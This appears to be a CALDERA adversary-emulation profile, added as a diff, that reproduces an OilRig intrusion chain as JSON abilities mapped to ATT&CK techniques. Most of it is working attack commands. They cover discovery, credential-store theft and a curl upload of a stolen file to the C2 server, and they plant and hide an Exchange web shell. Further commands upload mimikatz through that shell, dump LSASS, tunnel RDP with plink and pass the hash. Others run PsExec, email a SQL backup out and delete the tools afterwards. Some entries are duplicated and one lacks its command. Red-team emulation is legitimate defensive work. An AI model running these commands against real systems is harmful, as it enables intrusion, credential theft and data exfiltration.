@@ -1,0 +1,517 @@
+{
+  "adversary": "OilRig",
+  "abilities": [
+    {
+      "ability_id": "ed2471a9-1eeb-4787-a5d8-61f66b278a50",
+      "platform": "windows",
+      "commands": {
+        "cmd": "cscript /nologo computername.vbs\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Information Discovery",
+      "attack_id": "T1082"
+    },
+    {
+      "ability_id": "88378065-bedf-46b9-a8b7-bc5897f4abcb",
+      "platform": "windows",
+      "commands": {
+        "cmd": "cscript /nologo username.vbs\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Owner/User Discovery",
+      "attack_id": "T1033"
+    },
+    {
+      "ability_id": "0386ef16-757e-425c-8355-88e5be40eb32",
+      "platform": "windows",
+      "commands": {
+        "cmd": "whoami"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Owner/User Discovery",
+      "attack_id": "T1033"
+    },
+    {
+      "ability_id": "a9861ea9-4f9a-46c9-ba60-15a02806dfdc",
+      "platform": "windows",
+      "commands": {
+        "cmd": "hostname"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Information Discovery",
+      "attack_id": "T1082"
+    },
+    {
+      "ability_id": "628e8ad3-14af-4670-b797-bcf175a42842",
+      "platform": "windows",
+      "commands": {
+        "cmd": "ipconfig /all"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Network Configuration Discovery",
+      "attack_id": "T1016"
+    },
+    {
+      "ability_id": "13d5ab62-c05a-4d25-bd8f-e3b27a5be611",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net user /domain"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Account Discovery: Domain Account",
+      "attack_id": "T1087.002"
+    },
+    {
+      "ability_id": "e0b534a6-bff3-4964-8f7b-863ddee224b0",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net group /domain"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Permission Groups Discovery: Domain Groups",
+      "attack_id": "T1069.002"
+    },
+    {
+      "ability_id": "3d450711-1062-4276-8bff-bb78ec4f4519",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net group \"domain admins\" /domain"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Permission Groups Discovery: Domain Groups",
+      "attack_id": "T1069.002"
+    },
+    {
+      "ability_id": "29c018ed-eb3e-4ddb-90ec-ba3d928a00e8",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net group \"Exchange Trusted Subsystem\" /domain"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Permission Groups Discovery: Domain Groups",
+      "attack_id": "T1069.002"
+    },
+    {
+      "ability_id": "41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net accounts /domain"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Password Policy Discovery",
+      "attack_id": "T1021"
+    },
+    {
+      "ability_id": "821fd81e-2086-4ea6-b792-fb9e044e2323",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net user"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Account Discovery: Local Account",
+      "attack_id": "T1087.001"
+    },
+    {
+      "ability_id": "ae4e4c08-82cb-4a17-a873-660f851a1a38",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net localgroup administrators"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Permission Groups Discovery: Local Groups",
+      "attack_id": "T1069.001"
+    },
+    {
+      "ability_id": "cb8e9faa-ac00-48d8-a359-88044a2c0252",
+      "platform": "windows",
+      "commands": {
+        "cmd": "netstat -na"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Network Connections Discovery",
+      "attack_id": "T1049"
+    },
+    {
+      "ability_id": "de39f574-f6cc-4026-973e-c5370b36220b",
+      "platform": "windows",
+      "commands": {
+        "cmd": "tasklist"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Process Discovery",
+      "attack_id": "T1057"
+    },
+    {
+      "ability_id": "e6eb7d18-606e-4889-8924-f75cafa92811",
+      "platform": "windows",
+      "commands": {
+        "cmd": "sc query"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Service Discovery",
+      "attack_id": "T1007"
+    },
+    {
+      "ability_id": "178bb431-4eaf-43b1-922c-f484ab54bbee",
+      "platform": "windows",
+      "commands": {
+        "cmd": "systeminfo"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Information Discovery",
+      "attack_id": "T1082"
+    },
+    {
+      "ability_id": "09502b3c-7541-4c11-92a9-f55e683a6355",
+      "platform": "windows",
+      "commands": {
+        "cmd": "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\""
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Query Registry",
+      "attack_id": "T1012"
+    },
+    {
+      "ability_id": "7971246d-1392-411e-a803-a7946cf9e4d2",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net user #{initial.target.user} /domain\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Account Discovery: Domain Account",
+      "attack_id": "T1087.002"
+    },
+    {
+      "ability_id": "6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe",
+      "platform": "windows",
+      "commands": {
+        "cmd": "net group \"SQL Admins\" /domain"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Permission Groups Discovery: Domain Groups",
+      "attack_id": "T1069.002"
+    },
+    {
+      "ability_id": "f9f1bd68-ec0a-47e7-8645-210844190d92",
+      "platform": "windows",
+      "commands": {
+        "cmd": "nslookup #{second.target.host}\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "Remote System Discovery",
+      "attack_id": "T1018"
+    },
+    {
+      "ability_id": "a23fb84f-dfb7-4d07-a6ec-0352ae983651",
+      "platform": "windows",
+      "commands": {
+        "cmd": "C:\\Users\\#{initial.target.user}\\AppData\\local\\SystemFailureReporter\\b.exe\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "credential-access",
+      "technique": "Credentials from Password Stores: Windows Credential Manager",
+      "attack_id": "T1555.004"
+    },
+    {
+      "ability_id": "021245dd-c0be-4900-bd6c-1c680f00a237",
+      "platform": "windows",
+      "commands": {
+        "cmd": "curl -F \"data=@C:\\Users\\#{initial.target.user}\\AppData\\Roaming\\fsociety.dat\" --header \"X-Request-ID: #{initial.target.user}-#{paw}\" #{server}/file/upload\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "exfiltration",
+      "technique": "Exfiltration Over C2 Channel",
+      "attack_id": "T1041"
+    },
+    {
+      "ability_id": "2f3be960-5c00-4f03-a9c2-da09c31d38d9",
+      "platform": "windows",
+      "commands": {
+        "cmd": "copy  C:\\Users\\#{initial.target.user}\\AppData\\Local\\SystemFailureReporter\\contact.aspx C:\\Users\\Public\\contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "command-and-control",
+      "technique": "Ingress Tool Transfer",
+      "attack_id": "T1105"
+    },
+    {
+      "ability_id": "7aaecfb7-a1eb-477c-8d53-ab3009389623",
+      "platform": "windows",
+      "commands": {
+        "cmd": "copy C:\\Users\\Public\\contact.aspx \"\\\\#{second.target.ip}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews\\\"\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "persistence",
+      "technique": "Server Software Component: Web Shell",
+      "attack_id": "T1505.003"
+    },
+    {
+      "ability_id": "5f7dc4b3-1287-4a25-b0b0-b6e73756cc11",
+      "platform": "windows",
+      "commands": {
+        "cmd": "attrib +h \"\\\\#{second.target.ip}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews\\contact.aspx\""
+      },
+      "privilege": "Unknown",
+      "tactic": "defense-evasion",
+      "technique": "Hide Artifacts: Hidden Files & Directories",
+      "attack_id": "T1082"
+    },
+    {
+      "ability_id": "87d3322b-a435-47b5-9f97-a8db4f86dad5",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=whoami\" https://#{second.target.ip}/ews/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Owner/User Discovery",
+      "attack_id": "T1033"
+    },
+    {
+      "ability_id": "48927544-5a18-11ed-9b6a-0242ac120002",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=ipconfig /all\" https://#{second.target.ip}/ews/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Network Configuration Discovery",
+      "attack_id": "T1016"
+    },
+    {
+      "ability_id": "5c279562-a004-4d9c-9ec6-a7dc4997f699",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=netstat -an\" https://#{second.target.ip}/ews/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "System Network Connections Discovery",
+      "attack_id": "T1049"
+    },
+    {
+      "ability_id": "f96e8195-8b0f-4b87-bdce-748dfda2861f",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\temp\\' -F \"vir=false\" -F \"nen=m64.exe\" -F 'f1=@m64.exe' https://#{second.target.ip}/EWS/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "command-and-control",
+      "technique": "Ingress Tool Transfer",
+      "attack_id": "T1105"
+    },
+    {
+      "ability_id": "f01e86f9-0b66-4191-beee-324c380690df",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=C:\\Windows\\Temp\\m64.exe privilege::debug sekurlsa::logonPasswords exit 1> C:\\Windows\\Temp\\01.txt\" https://#{second.target.ip}/ews/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "credential-access",
+      "technique": "OS Credential Dumping: LSASS Memory",
+      "attack_id": "T1003.001"
+    },
+    {
+      "ability_id": "845d36f1-13b6-4d42-a384-aa2f4af9bc27",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -o 01.txt --data 'don=c:\\windows\\temp\\01.txt' https://#{second.target.ip}/EWS/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "exfiltration",
+      "technique": "Exfiltration Over C2 Channel",
+      "attack_id": "T1041"
+    },
+    {
+      "ability_id": "6482ba12-fa47-409c-bab8-704de6475e38",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST --data \"pro=cmd.exe\" --data \"cmd=del C:\\windows\\temp\\01.txt C:\\windows\\temp\\m64.exe\" https://#{second.target.ip}/EWS/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "defense-evasion",
+      "technique": "Indicator Removal on Host: File Deletion",
+      "attack_id": "T1070.004"
+    },
+    {
+      "ability_id": "f3df5a83-2a5a-4277-8763-8fb51032d3fc",
+      "platform": "windows",
+      "commands": {
+        "cmd": "copy  C:\\Users\\#{initial.target.user}\\AppData\\Local\\SystemFailureReporter\\plink.exe C:\\Users\\Public\\Downloads\\plink.exe\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "command-and-control",
+      "technique": "Ingress Tool Transfer",
+      "attack_id": "T1105"
+    },
+    {
+      "ability_id": "212995b5-acfc-404b-b3a9-a19cc0afa9a5",
+      "platform": "windows",
+      "commands": {
+        "proc": "exec-background C:\\Users\\Public\\Downloads\\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw \"#{caldera.user.password}\" #{caldera.server.ip}\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "command-and-control",
+      "technique": "Protocol Tunneling",
+      "attack_id": "T1572"
+    },
+    {
+      "ability_id": "dc2efbdd-3ab4-44a0-9839-385540b8a8cc",
+      "platform": "linux",
+      "commands": {
+        "proc": "exec-background xfreerdp /u:'#{network.domain.name}\\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "lateral-movement",
+      "technique": "Remote Services: Remote Desktop Protocol",
+      "attack_id": "T1021.001"
+    },
+    {
+      "ability_id": "5cb977ae-87c8-450f-b016-f414b42ba60f",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\System32' -F \"vir=false\" -F \"nen=ps.exe\" -F 'f1=@PsExec.exe' https://#{second.target.host}/ews/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "command-and-control",
+      "technique": "Ingress Tool Transfer",
+      "attack_id": "T1105"
+    },
+    {
+      "ability_id": "d5b83af2-b79e-438d-acfc-2641282df698",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\Temp' -F \"vir=false\" -F \"nen=Nt.dat\" -F 'f1=@RDAT.exe' https://#{second.target.host}/ews/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "command-and-control",
+      "technique": "Ingress Tool Transfer",
+      "attack_id": "T1105"
+    },
+    {
+      "ability_id": "98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2",
+      "platform": "linux",
+      "commands": {
+        "sh": "curl -s --http1.1 --ntlm -u '#{network.domain.name}\\#{initial.target.user}:#{initial.target.password}' -k -X POST -F \"upl=f1\" -F 'sav=C:\\Windows\\System32' -F \"vir=false\" -F \"nen=mom64.exe\" -F 'f1=@m64.exe' https://#{second.target.host}/ews/contact.aspx\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "command-and-control",
+      "technique": "Ingress Tool Transfer",
+      "attack_id": "T1105"
+    },
+    {
+      "ability_id": "44073aa3-70e9-4a48-86b7-c25b6f29c25c",
+      "platform": "linux",
+      "commands": {
+        "sh": "sleep 5;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool key --window \"$rdp_window\" Super_L;\nsleep 5; \nxdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"cmd\";\nsleep 3; \nxdotool key --window \"$rdp_window\" Ctrl+Shift+Return;\nsleep 3; \nxdotool key --window \"$rdp_window\" Tab Tab;\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'C:\\Windows\\System32\\mom64.exe \"privilege::debug\" \"sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name} /ntlm:#{second.target.ntlm}\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'copy C:\\Windows\\Temp\\Nt.dat \\\\#{third.target.ip}\\C$\\ProgramData\\';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'C:\\Windows\\System32\\ps.exe \\\\#{third.target.ip} cmd.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 5;\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "execution",
+      "technique": "System Services: Service Execution",
+      "attack_id": "T1569.002"
+    },
+    {
+      "ability_id": "f1f34439-ca0d-4fe7-99af-a198a29b6a3e",
+      "platform": "linux",
+      "commands": {
+        "sh": "sleep 3;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'dir \"C:\\Program Files\\Microsoft SQL Server\\\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'dir \"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 4;\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "discovery",
+      "technique": "File and Directory Discovery",
+      "attack_id": "T1083"
+    },
+    {
+      "ability_id": "885c14a2-bc56-4176-8671-4cb25489ae39",
+      "platform": "linux",
+      "commands": {
+        "sh": "sleep 2;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'mkdir C:\\Programdata\\Vmware';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'move C:\\Programdata\\Nt.dat C:\\Programdata\\Vmware\\VMware.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'cd \"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'C:\\ProgramData\\Vmware\\VMware.exe --path=\"sitedata_db.bak\" --to=\"#{exfil.target.email}\" --from=\"#{initial.target.user}@#{network.domain.name}\" --server=\"#{second.target.ip}\" --password='#{initial.target.password}' --chunksize=\"200000\"';\nsleep 1; \nxdotool key --window \"$rdp_window\" Return;\nsleep 15;\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "exfiltration",
+      "technique": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
+      "attack_id": "T1048.003"
+    },
+    {
+      "ability_id": "0c5cf9e2-3152-4b4c-9629-2ed7a00da09d",
+      "platform": "linux",
+      "commands": {
+        "sh": "sleep 3;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'del C:\\ProgramData\\VMware\\VMware.exe';\nsleep 3; \nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'rmdir C:\\ProgramData\\VMware';\nsleep 3; \nxdotool key --window \"$rdp_window\" Return;\nsleep 1;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 1;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;\nxdotool type --window \"$rdp_window\" 'del C:\\Windows\\System32\\mom64.exe C:\\Windows\\temp\\Nt.dat C:\\Windows\\System32\\ps.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;   \nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;\n\nkill $(ps aux | grep \"sshd: #{caldera.user.name}\" | grep -v priv | grep -v grep | awk '{print $2}')\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "defense-evasion",
+      "technique": "Indicator Removal on Host: File Deletion",
+      "attack_id": "T1070.004"
+    },
+    {
+      "ability_id": "d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15",
+      "platform": "windows",
+      "technique": "File and Directory Discovery",
+      "attack_id": "T1083"
+    },
+    {
+      "ability_id": "885c14a2-bc56-4176-8671-4cb25489ae39",
+      "platform": "linux",
+      "commands": {
+        "sh": "sleep 2;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'mkdir C:\\Programdata\\Vmware';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'move C:\\Programdata\\Nt.dat C:\\Programdata\\Vmware\\VMware.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'cd \"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\\"';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'C:\\ProgramData\\Vmware\\VMware.exe --path=\"sitedata_db.bak\" --to=\"#{exfil.target.email}\" --from=\"#{initial.target.user}@#{network.domain.name}\" --server=\"#{second.target.ip}\" --password='#{initial.target.password}' --chunksize=\"200000\"';\nsleep 1; \nxdotool key --window \"$rdp_window\" Return;\nsleep 15;\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "exfiltration",
+      "technique": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
+      "attack_id": "T1048.003"
+    },
+    {
+      "ability_id": "0c5cf9e2-3152-4b4c-9629-2ed7a00da09d",
+      "platform": "linux",
+      "commands": {
+        "sh": "sleep 3;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:localhost\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nsleep 3; \nxdotool type --window \"$rdp_window\" 'del C:\\ProgramData\\VMware\\VMware.exe';\nsleep 3; \nxdotool key --window \"$rdp_window\" Return;\nsleep 3; \nxdotool type --window \"$rdp_window\" 'rmdir C:\\ProgramData\\VMware';\nsleep 3; \nxdotool key --window \"$rdp_window\" Return;\nsleep 1;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 1;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 3;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;\nxdotool type --window \"$rdp_window\" 'del C:\\Windows\\System32\\mom64.exe C:\\Windows\\temp\\Nt.dat C:\\Windows\\System32\\ps.exe';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;   \nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 2;\n\nkill $(ps aux | grep \"sshd: #{caldera.user.name}\" | grep -v priv | grep -v grep | awk '{print $2}')\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "defense-evasion",
+      "technique": "Indicator Removal on Host: File Deletion",
+      "attack_id": "T1070.004"
+    },
+    {
+      "ability_id": "d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15",
+      "platform": "windows",
+      "commands": {
+        "cmd": "del C:\\Users\\gosta\\AppData\\Roaming\\fsociety.dat C:\\Users\\Public\\Downloads\\plink.exe;\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "defense-evasion",
+      "technique": "Indicator Removal on Host: File Deletion",
+      "attack_id": "T1070.004"
+    },
+    {
+      "ability_id": "16767c68-a865-46af-a0e4-ff8d742efc3f",
+      "platform": "windows",
+      "commands": {
+        "cmd": "curl -s -H \"KEY:#{server.api.key}\" -H \"Content-Type: application/json\" -X PATCH http://#{caldera.server.ip}:8888/api/v2/agents/#{paw} -d \"{\\\"watchdog\\\":1}\"\n"
+      },
+      "privilege": "Unknown",
+      "tactic": "defense-evasion",
+      "technique": "Indicator Removal on Host: File Deletion",
+      "attack_id": "T1070.004"
+    }
+  ]
+}      
